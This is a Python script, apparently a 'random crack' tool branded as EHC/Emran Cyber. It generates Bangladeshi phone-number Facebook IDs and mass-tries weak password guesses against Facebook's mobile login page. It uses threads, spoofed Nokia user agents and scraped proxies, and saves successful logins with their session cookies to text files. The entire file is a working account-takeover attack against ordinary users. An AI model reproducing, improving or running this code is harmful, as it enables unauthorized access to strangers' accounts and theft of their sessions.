import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
li="\033[38;5;46m—"

os.system('espeak -a 300 "author emran "')
os.system('espeak -a 300 "Facebook  emran hossain "')
os.system('espeak -a 300 "whathapp 9 7 1 0 5 6 9 5 4 9 8 5 7 "')
os.system('espeak -a 300 "github emran cyber 9 9 4 8 7 "')
os.system('espeak -a 300 "telegram 9 7 1 0 5 6 9 4 3 5 3 9 3 3 "')
os.system('espeak -a 300 "imo 9 7 1 0 5 6 4 3 5 3 9 3 3 "')
os.system('espeak -a 300 "from Bangladesh "')
os.system('espeak -a 300 "WELCOME Assalamu Alaikum I Imran will fast in the month of Ramadan inshallah"')

cox=str(f"{li}"*37)        
logo = ("""
  \x1b[38;5;196m{𝗘}\033[38;5;46m┏━━━┓\x1b[38;5;196m┏━┓┏━┓\033[34;1m┏━━━┓\033[37;1m┏━━━┓\033[33;1m┏━┓─┏┓\x1b[38;5;196m{𝗘} 
  \033[38;5;46m{𝗠}\033[38;5;46m┃┏━━┛\x1b[38;5;196m┃┃┗┛┃┃\033[34;1m┃┏━┓┃\033[37;1m┃┏━┓┃\033[33;1m┃┃┗┓┃┃\033[38;5;46m{𝗠} 
  \033[37;1m{𝗥}\033[38;5;46m┃┗━━┓\x1b[38;5;196m┃┏┓┏┓┃\033[34;1m┃┗━┛┃\033[37;1m┃┃─┃┃\033[33;1m┃┏┓┗┛┃\033[37;1m{𝗥} 
  \033[33;1m{𝗔}\033[38;5;46m┃┏━━┛\x1b[38;5;196m┃┃┃┃┃┃\033[34;1m┃┏┓┏┛\033[37;1m┃┗━┛┃\033[33;1m┃┃┗┓┃┃\033[33;1m{𝗔} 
  \033[34;1m{𝗡}\033[38;5;46m┃┗━━┓\x1b[38;5;196m┃┃┃┃┃┃\033[34;1m┃┃┃┗┓\033[37;1m┃┏━┓┃\033[33;1m┃┃─┃┃┃\033[34;1m{𝗡} 
\033[35;1m{𝗘𝗛𝗖}\033[38;5;46m┗━━━┛\x1b[38;5;196m┗┛┗┛┗┛\033[34;1m┗┛┗━┛\033[37;1m┗┛━┗┛\033[33;1m┗┛─┗━┛\033[35;1m{𝗘𝗛𝗖}
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46m𝗘𝗠𝗥𝗔𝗡
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟮}\033[38;5;46m\x1b[38;5;196m╚══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \x1b[38;5;196m𝟵𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟯}\033[38;5;46m\033[38;5;46m╔══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \033[34;1m𝟵𝟳𝟭𝟬𝟱𝟲𝟰𝟯𝟱𝟯𝟵𝟯𝟯
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟰}\033[38;5;46m\033[38;5;46m╚══➻〱𝗥𝗔𝗡𝗗𝗢𝗠\033[33;1m➽ \033[33;1m𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟬𝟱
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟱}\033[38;5;46m\033[33;1m╔══➻〱𝗧𝗢𝗢𝗟𝗦\033[33;1m➽  \033[33;1m𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟲}\033[38;5;46m\033[33;1m╚══➻〱𝗙𝗥𝗢𝗠\033[33;1m➽  \x1b[38;5;196m 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖""")
logo1 = ("""
  \x1b[38;5;196m{𝗘}\033[38;5;46m┏━━━┓\x1b[38;5;196m┏━┓┏━┓\033[34;1m┏━━━┓\033[37;1m┏━━━┓\033[33;1m┏━┓─┏┓\x1b[38;5;196m{𝗘} 
  \033[38;5;46m{𝗠}\033[38;5;46m┃┏━━┛\x1b[38;5;196m┃┃┗┛┃┃\033[34;1m┃┏━┓┃\033[37;1m┃┏━┓┃\033[33;1m┃┃┗┓┃┃\033[38;5;46m{𝗠} 
  \033[37;1m{𝗥}\033[38;5;46m┃┗━━┓\x1b[38;5;196m┃┏┓┏┓┃\033[34;1m┃┗━┛┃\033[37;1m┃┃─┃┃\033[33;1m┃┏┓┗┛┃\033[37;1m{𝗥} 
  \033[33;1m{𝗔}\033[38;5;46m┃┏━━┛\x1b[38;5;196m┃┃┃┃┃┃\033[34;1m┃┏┓┏┛\033[37;1m┃┗━┛┃\033[33;1m┃┃┗┓┃┃\033[33;1m{𝗔} 
  \033[34;1m{𝗡}\033[38;5;46m┃┗━━┓\x1b[38;5;196m┃┃┃┃┃┃\033[34;1m┃┃┃┗┓\033[37;1m┃┏━┓┃\033[33;1m┃┃─┃┃┃\033[34;1m{𝗡} 
\033[35;1m{𝗘𝗛𝗖}\033[38;5;46m┗━━━┛\x1b[38;5;196m┗┛┗┛┗┛\033[34;1m┗┛┗━┛\033[37;1m┗┛━┗┛\033[33;1m┗┛─┗━┛\033[35;1m{𝗘𝗛𝗖}
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════{𝗘𝗛𝗖}
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════{𝗘𝗛𝗖}
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46m𝗘𝗠𝗥𝗔𝗡
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟮}\033[38;5;46m\x1b[38;5;196m╚══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \x1b[38;5;196m𝟵𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟯}\033[38;5;46m\033[38;5;46m╔══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \033[34;1m𝟵𝟳𝟭𝟬𝟱𝟲𝟰𝟯𝟱𝟯𝟵𝟯𝟯
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟰}\033[38;5;46m\033[38;5;46m╚══➻〱𝗥𝗔𝗡𝗗𝗢𝗠\033[33;1m➽ \033[33;1m𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟬𝟱
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟱}\033[38;5;46m\033[33;1m╔══➻〱𝗧𝗢𝗢𝗟𝗦\033[33;1m➽  \033[33;1m𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵
\033[34;1m✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝\x1b[38;5;196m {𝟲}\033[38;5;46m\033[33;1m╚══➻〱𝗙𝗥𝗢𝗠\033[33;1m➽  \x1b[38;5;196m 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════{𝗘𝗛𝗖}""")

def Emranx():
	print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖')

def Main():
        os.system("clear")
        print(logo)
        print(" [\033[38;5;46m𝗘𝗛𝗖 𝗘𝗠𝗥𝗔𝗡] 𝗥𝗔𝗡𝗗𝗢𝗠 𝗕𝗗")
        print(" [\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 𝟵𝟵] 𝗙𝗨𝗖𝗞 𝗬𝗢𝗨")
        Emran =input("\n [\033[38;5;46m𝗘𝗛𝗖]𝗖𝗛𝗢𝗜𝗖𝗘  : ")
        if Emran in ["EHC EMRAN"]:
            fuck()
        if Emran in [" CYBER 99", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖')
    print('[\033[38;5;46m𝗘𝗛𝗖]𝗦𝗜𝗠𝗘 𝗖𝗢𝗗𝗘 : 017, 018, 019, 016')
    code = input('[\033[38;5;46m[𝗘𝗛𝗖] 𝗖𝗛𝗢𝗜𝗖𝗘 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[\033[38;5;46m𝗘𝗛𝗖]𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : 2000 3000 5000 10000 ')
    limit = int(input('[\033[38;5;46m𝗘𝗠𝗥𝗔𝗡] 𝗖𝗛𝗢𝗜𝗖𝗘 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖')
        print('[\033[38;5;46m𝗘𝗠𝗥𝗔𝗡\x1b[38;5;196m 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 \033[34;1m𝗜𝗗: '+tl)
        print("[\033[38;5;46m𝗘𝗛𝗖\033[37;1m 𝗦𝗜𝗠𝗘 \x1b[38;5;196m𝗖𝗢𝗗𝗘: "+code)
        print('[\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 \033[38;5;46m𝗪𝗢𝗥𝗞\x1b[38;5;196m 𝗪𝗜𝗙𝗜\033[34;1m 𝗗𝗔𝗧𝗔')
        print('[\033[38;5;46m𝟵𝟵 \x1b[38;5;196m𝗣𝗔𝗜𝗗 \033[34;1m𝗖𝗢𝗠𝗠𝗔𝗡𝗗')
        print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(emran2,uid,pwx,tl)
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖')
    print(' [\033[38;5;46m𝗘𝗛𝗖] Crack process has been completed')
    print(' [\033[38;5;46m𝗖𝗬𝗕𝗘𝗥 𝟵𝟵] OK Ids saved in EMRAN/OK.txt')
    print(' [\033[38;5;46m𝗘𝗠𝗥𝗔𝗡] CP Ids s═════aved in EMRAN/CP.txt')
    print('\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖')
def emran2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[38;5;46m〱EMRAN〱%s/%s〱𝗟𝗢𝗖𝗞-𝗜𝗗➲😓%s➲〱𝗢𝗞-𝗜𝗗➲💎%s\r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#_________𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠➻➲🥰🥰        
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text           
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝗜𝗗-------➲🥰🥰       
                print(f"""
\033[33;1m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆╔══➻💎\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻💎\033[38;5;46m{uid} 
\033[33;1m𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻💎\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻💎\033[38;5;46m{ps}
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎(𝗢𝗞✅)\033[38;5;46m{coki}
""")
                open('/sdcard/EMRAN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
 #_________𝗖𝗣_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗟𝗢𝗖𝗞-𝗜𝗗------➲😓😓
                print(f"""
\033[33;1m𝗟𝗢𝗖𝗞-𝗜𝗗➲😓😓╔══➻💎\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻💎\033[38;5;46m{uid} 
\033[33;1m𝗟𝗢𝗖𝗞-𝗜𝗗➲😓😓╚══➻💎\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻💎\033[38;5;46m{ps}
""")
                open('/sdcard/EMRAN-𝗟𝗢𝗖𝗞-𝗜𝗗➲😓😓✅-𝗜𝗗.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
#_____________𝘾𝙍𝘼𝘾𝙆𝙄𝙉𝙂 👇👇𝙎𝙔𝙎𝙏𝙀𝙈 __________
        brand=random.choice(['EMRAN CYBER','EMRAN CYBER ','EMRAN CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🐼','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}EMRAN❤️‍🔥🎁CYBER🥰\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}ᥬ\033[38;5;46m{dt_string}🤢᭄𝘽𝙊𝙎𝙎=𝙀𝙈𝙍𝘼𝙉🤢᭄ꓧٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜꓥٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜꓚٜٜٜٜٜٜٜٜٜٜٜٜꓗٜٜٜٜٜٜٜٜꓰٜٜٜٜD{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
Main()
